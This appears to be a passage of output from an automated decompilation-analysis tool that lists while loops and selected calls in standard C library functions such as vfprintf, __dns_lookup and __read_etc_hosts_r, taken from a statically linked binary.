+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		free(v11);
+=============================WHILE LOOPS ID : 13 @ __pthread_alt_unlock ====================================
+++++++++ WHILE START : 2106 
+++++++++ WHILE FUNCTION : __pthread_alt_unlock 
+++++++++ WHILE END : 2226 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		wait_node_dequeue();
+		wait_node_free();
+		wait_node_dequeue();
+=============================WHILE LOOPS ID : 18 @ __pthread_unlock ====================================
+++++++++ WHILE START : 2455 
+++++++++ WHILE FUNCTION : __pthread_unlock 
+++++++++ WHILE END : 2556 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 26 @ __GI_readdir ====================================
+++++++++ WHILE START : 4965 
+++++++++ WHILE FUNCTION : __GI_readdir 
+++++++++ WHILE END : 5022 
+++++++++ INTRESTING INSTRUCTIONS :  
+		int32_t v14 = __getdents(*(int32_t *)v6, v13, v12, g7); // 0x805b500
+=============================WHILE LOOPS ID : 30 @ _vfprintf_internal ====================================
+++++++++ WHILE START : 6873 
+++++++++ WHILE FUNCTION : _vfprintf_internal 
+++++++++ WHILE END : 7733 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 33 @ _ppfs_parsespec ====================================
+++++++++ WHILE START : 8081 
+++++++++ WHILE FUNCTION : _ppfs_parsespec 
+++++++++ WHILE END : 9225 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 35 @ _stdio_openlist_dec_use ====================================
+++++++++ WHILE START : 9269 
+++++++++ WHILE FUNCTION : _stdio_openlist_dec_use 
+++++++++ WHILE END : 9305 
+++++++++ INTRESTING INSTRUCTIONS :  
+		free(v7);
+=============================WHILE LOOPS ID : 36 @ __GI_fgets_unlocked ====================================
+++++++++ WHILE START : 9329 
+++++++++ WHILE FUNCTION : __GI_fgets_unlocked 
+++++++++ WHILE END : 9405 
+++++++++ INTRESTING INSTRUCTIONS :  
+		int32_t v8 = getc_unlocked(); // 0x805d15d
+=============================WHILE LOOPS ID : 41 @ inet_pton ====================================
+++++++++ WHILE START : 10001 
+++++++++ WHILE FUNCTION : inet_pton 
+++++++++ WHILE END : 10387 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		if (inet_pton4(v17, (int32_t)v19, v9) >= 1) {
+=============================WHILE LOOPS ID : 42 @ inet_aton ====================================
+++++++++ WHILE START : 10413 
+++++++++ WHILE FUNCTION : inet_aton 
+++++++++ WHILE END : 10509 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 43 @ __malloc_consolidate ====================================
+++++++++ WHILE START : 11399 
+++++++++ WHILE FUNCTION : __malloc_consolidate 
+++++++++ WHILE END : 11564 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 51 @ __stdio_WRITE ====================================
+++++++++ WHILE START : 12749 
+++++++++ WHILE FUNCTION : __stdio_WRITE 
+++++++++ WHILE END : 12849 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 54 @ _fpmaxtostr ====================================
+++++++++ WHILE START : 13653 
+++++++++ WHILE FUNCTION : _fpmaxtostr 
+++++++++ WHILE END : 17382 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 55 @ _fpmaxtostr ====================================
+++++++++ WHILE START : 17392 
+++++++++ WHILE FUNCTION : _fpmaxtostr 
+++++++++ WHILE END : 17488 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 63 @ __GI_strpbrk ====================================
+++++++++ WHILE START : 17773 
+++++++++ WHILE FUNCTION : __GI_strpbrk 
+++++++++ WHILE END : 17828 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 65 @ __decode_dotted ====================================
+++++++++ WHILE START : 18729 
+++++++++ WHILE FUNCTION : __decode_dotted 
+++++++++ WHILE END : 18808 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 66 @ __dns_lookup ====================================
+++++++++ WHILE START : 18856 
+++++++++ WHILE FUNCTION : __dns_lookup 
+++++++++ WHILE END : 20448 
+++++++++ INTRESTING INSTRUCTIONS :  
+		int32_t v23 = __libc_close(-1); // 0x8065d16
+		int32_t v37 = inet_pton(-1, (char *)str2, (int32_t)&n); // 0x8065e8a
+		*(int32_t *)(g9 + 176) = inet_addr(-1);
+		int32_t v40 = socket(-1, str2, (int32_t)&n); // 0x8065ee5
+		if (__libc_connect(-1, str2, (int32_t)&n) >= 0) {
+		__libc_send(-1, str2, (int32_t)&n, (int32_t)&n);
+		int32_t v48 = __libc_recv(-1, str2, (int32_t)&n, (int32_t)&n); // 0x8065f7a
+		__libc_close(v10);
+		free(v11);
+		free(v11);
+		while (true) {
+		__libc_close(-1);
+		free(-1);
+		free(-1);
+		free(-1);
+		free(-1);
+		free(-1);
+		__libc_close(-1);
+		free(-1);
+		free(-1);
+		free(-1);
+		__libc_close(-1);
+		free(-1);
+		free(-1);
+		free(-1);
+		__libc_close(-1);
+		free(-1);
+		free(-1);
+		free(-1);
+		free(-1);
+		v93 = __libc_close(-1);
+		v94 = free(-1);
+		v96 = free(-1);
+		v96 = free(-1);
+		v93 = __libc_close(-1);
+		v94 = free(-1);
+		v96 = free(-1);
+		v96 = free(-1);
+		__libc_close(-1);
+		free(-1);
+		free(-1);
+		free(-1);
+		free(-1);
+		__libc_close(-1);
+		free(-1);
+		free(-1);
+		__libc_close(-1);
+		free(-1);
+		__libc_close(v10);
+		free(v11);
+		free(v11);
+		__libc_close(v10);
+		free(v11);
+		free(v11);
+		__libc_close(v10);
+		free(v11);
+		free(v11);
+		__libc_close(v10);
+		free(v11);
+		v19 = free(v11);
+=============================WHILE LOOPS ID : 67 @ __open_nameservers ====================================
+++++++++ WHILE START : 20751 
+++++++++ WHILE FUNCTION : __open_nameservers 
+++++++++ WHILE END : 20779 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (fgets(str, 128, g7) == 0) {
+		__GI_fclose((int16_t *)g3);
+=============================WHILE LOOPS ID : 68 @ __open_nameservers ====================================
+++++++++ WHILE START : 20781 
+++++++++ WHILE FUNCTION : __open_nameservers 
+++++++++ WHILE END : 20823 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 69 @ __open_nameservers ====================================
+++++++++ WHILE START : 20832 
+++++++++ WHILE FUNCTION : __open_nameservers 
+++++++++ WHILE END : 20964 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 71 @ __open_nameservers ====================================
+++++++++ WHILE START : 21019 
+++++++++ WHILE FUNCTION : __open_nameservers 
+++++++++ WHILE END : 21032 
+++++++++ INTRESTING INSTRUCTIONS :  
+		free(*(int32_t *)(4 * v53 + 0x807f544));
+=============================WHILE LOOPS ID : 72 @ __open_nameservers ====================================
+++++++++ WHILE START : 21088 
+++++++++ WHILE FUNCTION : __open_nameservers 
+++++++++ WHILE END : 21106 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (fgets(str, 128, g7) != 0) {
+		__GI_fclose((int16_t *)g3);
+=============================WHILE LOOPS ID : 74 @ __open_nameservers ====================================
+++++++++ WHILE START : 21129 
+++++++++ WHILE FUNCTION : __open_nameservers 
+++++++++ WHILE END : 21146 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (fgets(str, 128, g7) != 0) {
+		__GI_fclose((int16_t *)g3);
+=============================WHILE LOOPS ID : 78 @ __GI_strspn ====================================
+++++++++ WHILE START : 21830 
+++++++++ WHILE FUNCTION : __GI_strspn 
+++++++++ WHILE END : 21878 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 81 @ __get_myaddress ====================================
+++++++++ WHILE START : 22095 
+++++++++ WHILE FUNCTION : __get_myaddress 
+++++++++ WHILE END : 22191 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		__libc_close(g3);
+		str = "__get_myaddress: ioctl";
+		__libc_close(g3);
+=============================WHILE LOOPS ID : 85 @ __read_etc_hosts_r ====================================
+++++++++ WHILE START : 22773 
+++++++++ WHILE FUNCTION : __read_etc_hosts_r 
+++++++++ WHILE END : 23078 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		if (__GI_strcasecmp(v22, *(int32_t *)(g4 + 4 * v52)) == 0) {
+		if (inet_pton(10, (char *)*(int32_t *)g4, v8) >= 1) {
+		__GI_fclose((int16_t *)size);
+		if (inet_pton(2, (char *)*(int32_t *)g4, (int32_t)v10) >= 1) {
+		__GI_fclose((int16_t *)size);
+		if (fgets(str, size, g7) == 0) {
+		v33 = __GI_fclose((int16_t *)size);
+		if (fgets(str, size, g7) == 0) {
+		if (fgets(str, size, g7) == 0) {
+		if (fgets(str, size, g7) == 0) {
+		__GI_fclose((int16_t *)size);
